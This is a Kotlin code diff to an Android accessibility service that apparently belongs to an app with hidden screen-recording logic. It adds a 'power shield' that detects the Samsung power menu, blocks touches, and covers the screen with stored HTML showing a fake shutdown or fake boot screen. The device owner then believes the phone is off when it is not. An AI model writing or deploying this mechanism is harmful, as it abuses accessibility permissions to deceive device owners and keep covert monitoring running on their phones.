@@ -254,77 +254,66 @@ class MyAccessibilityService : AccessibilityService() {
         
         // --- SCREEN RECORD GHOST LOGIC ---
         if (pkgName.contains("systemui", ignoreCase = true)) {
-            // --- POWER SHIELD LOGIC ---
+            // --- UNIVERSAL SAMSUNG POWER SHIELD (Adaptive Universal Guard) ---
             val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-            if (statsPrefs.getBoolean("power_shield_active", false)) {
-                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-                    // UPGRADED: IO Dispatcher avoids Deep Doze CPU throttling for instant UI tree evaluation
-                    CoroutineScope(Dispatchers.IO).launch {
-                        val startTime = System.currentTimeMillis()
-                        // Log only on State Changes to avoid spamming for every clock/battery update
-                        if (event.eventType == android.view.accessibility.AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                            DebugLogger.log("SHIELD_VERBOSE", "Evaluation loop started for SystemUI Window State Change.")
-                        }
-                        var attempts = 0
-                        
-                        while (attempts < 10) { // 50ms * 10 = 500ms max window
-                            val loopTime = System.currentTimeMillis()
-                            val root = rootInActiveWindow
-                            // 1. Precise Identification (Prevents Notification Shade False Positives)
-                            val isSamsungMenu = !root?.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_item_list").isNullOrEmpty()
-                            val isAospMenu = !root?.findAccessibilityNodeInfosByViewId("com.android.systemui:id/global_actions_view").isNullOrEmpty()
+            if (statsPrefs.getBoolean("power_shield_active", false) && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                
+                // 1. STAGE 1: IMMEDIATE INTERCEPT (0ms Metadata Trigger)
+                DynamicUIManager.showTouchGuard(this)
+
+                CoroutineScope(Dispatchers.IO).launch {
+                    var attempts = 0
+                    var targetVerified = false
+                    val timeout = statsPrefs.getLong("power_shield_timeout", 15L)
+
+                    // 2. STAGE 2: ADAPTIVE VERIFICATION LOOP (Exit on Certainty)
+                    while (attempts < 10) {
+                        val root = rootInActiveWindow
+                        if (root != null) {
+                            // CERTAINTY REACHED: The tree is now filled.
+                            val isPowerMenu = !root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_item_list").isNullOrEmpty()
+                            val isConfirmScreen = !root.findAccessibilityNodeInfosByViewId("com.android.systemui:id/sec_global_actions_confirmation").isNullOrEmpty()
                             
-                            // 2. Heuristic fallback: The actual Power Menu almost always has both "Power off" and "Restart". The Quick Settings shade does not.
-                            // CONSTRAINT: Ensure the matched text actually belongs to a system-level window, isolating it from active apps like Notepad.
-                            val hasPowerOff = root?.findAccessibilityNodeInfosByText("Power off")?.any { it.packageName?.toString()?.contains("systemui", true) == true || it.packageName?.toString()?.contains("android", true) == true } == true
-                            val hasRestart = root?.findAccessibilityNodeInfosByText("Restart")?.any { it.packageName?.toString()?.contains("systemui", true) == true || it.packageName?.toString()?.contains("android", true) == true } == true
-                            val isGenericMenu = hasPowerOff && hasRestart
-                            
-                            if (isSamsungMenu || isAospMenu || isGenericMenu) {
-                                val detectTime = System.currentTimeMillis()
-                                DebugLogger.log("SHIELD_VERBOSE", "Menu Identified. Attempt: $attempts | Parsing Time: ${detectTime - loopTime}ms | Total Elapsed: ${detectTime - startTime}ms")
-                                
-                                val now = System.currentTimeMillis()
-                                val lastTrigger = statsPrefs.getLong("power_shield_last_trigger", 0L)
-                                if (now - lastTrigger > 2000) {
-                                    statsPrefs.edit().putLong("power_shield_last_trigger", now).apply()
-                                    
-                                    val state = statsPrefs.getString("power_shield_state", "NORMAL") ?: "NORMAL"
-                                    val html = if (state == "FAKE_OFF") {
-                                        statsPrefs.getString("power_shield_html_boot", "") ?: ""
-                                    } else {
-                                        statsPrefs.getString("power_shield_html_shutdown", "") ?: ""
-                                    }
-                                    
-                                    val method = statsPrefs.getString("power_shield_method", "ACC") ?: "ACC"
-                                    val timeout = statsPrefs.getLong("power_shield_timeout", 10L)
-                                    
-                                    // Deploy the overlay cleanly without fighting the OS window manager
-                                    DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html)
-                                    DebugLogger.log("POWER_SHIELD", "Power Menu Confirmed & Intercepted. Total latency: ${System.currentTimeMillis() - startTime}ms. Failsafe: ${timeout}s")
-                                    
-                                    // Ensure Dimmer stays on top
-                                    Handler(Looper.getMainLooper()).postDelayed({
-                                        DimmerManager.pushToFront(this@MyAccessibilityService)
-                                    }, 200)
-                                    
-                                    if (timeout > 0) {
-                                        Handler(Looper.getMainLooper()).postDelayed({
-                                            DynamicUIManager.removeOverlay(this@MyAccessibilityService)
-                                        }, timeout * 1000)
-                                    } else {
-                                        DebugLogger.log("POWER_SHIELD", "Persistent mode: No timeout scheduled.")
-                                    }
-                                } else {
-                                    DebugLogger.log("SHIELD_VERBOSE", "Ignored due to 2000ms cooldown.")
-                                }
-                                break
+                            if (isPowerMenu || isConfirmScreen) {
+                                targetVerified = true
+                                break // Target Confirmed
+                            } else {
+                                // FALSE POSITIVE: It's a volume slider or other SystemUI window.
+                                break // Target Mismatch
                             }
-                            attempts++
-                            delay(50)
                         }
+                        delay(50) // Hardware inflation buffer
+                        attempts++
+                    }
+
+                    if (targetVerified) {
+                        // 3. STAGE 3: UPGRADE TO FAKE UI
+                        val now = System.currentTimeMillis()
+                        val lastTrigger = statsPrefs.getLong("power_shield_last_trigger", 0L)
+                        if (now - lastTrigger > 2000) {
+                            statsPrefs.edit().putLong("power_shield_last_trigger", now).apply()
+                            
+                            val state = statsPrefs.getString("power_shield_state", "NORMAL") ?: "NORMAL"
+                            val html = if (state == "FAKE_OFF") statsPrefs.getString("power_shield_html_boot", "") else statsPrefs.getString("power_shield_html_shutdown", "")
+                            val method = statsPrefs.getString("power_shield_method", "ACC") ?: "ACC"
+
+                            Handler(Looper.getMainLooper()).post {
+                                DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html ?: "", true)
+                                // The TouchGuard is automatically covered/superceded by the Fake UI WebView
+                            }
+                            
+                            if (timeout > 0) {
+                                delay(timeout * 1000)
+                                DynamicUIManager.removeOverlay(this@MyAccessibilityService)
+                                DynamicUIManager.removeTouchGuard(this@MyAccessibilityService)
+                            }
+                        }
+                    } else {
+                        // 4. STAGE 4: PEACE OUT EARLY (False Alarm)
+                        DynamicUIManager.removeTouchGuard(this@MyAccessibilityService)
                     }
                 }
+            }
             }
 
             if (ScreenRecordManager.expectedMode == "AUTO") {
